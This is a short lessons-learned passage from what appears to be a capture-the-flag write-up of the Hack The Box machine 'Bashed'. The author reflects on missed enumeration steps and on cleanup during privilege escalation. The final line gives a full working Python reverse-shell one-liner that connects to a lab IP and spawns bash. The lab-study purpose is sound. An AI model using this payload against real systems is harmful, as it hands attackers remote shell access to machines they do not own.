# Key Lessons

This privesc was a little messy from me. I struggled getting an interactive shell, and missed some basic enumeration like `sudo -l` and checking for scheduled processes.

I also could have handled the `.py` file editing better - [0xdf's writeup](https://0xdf.gitlab.io/2018/04/29/htb-bashed.html) involved moving the file to `.py.old` and making a new one, which would have helped in the cleanup process (and for detecting that it was being run in the first place).

I also now have a new Python reverse shell to use - `import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.13",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")`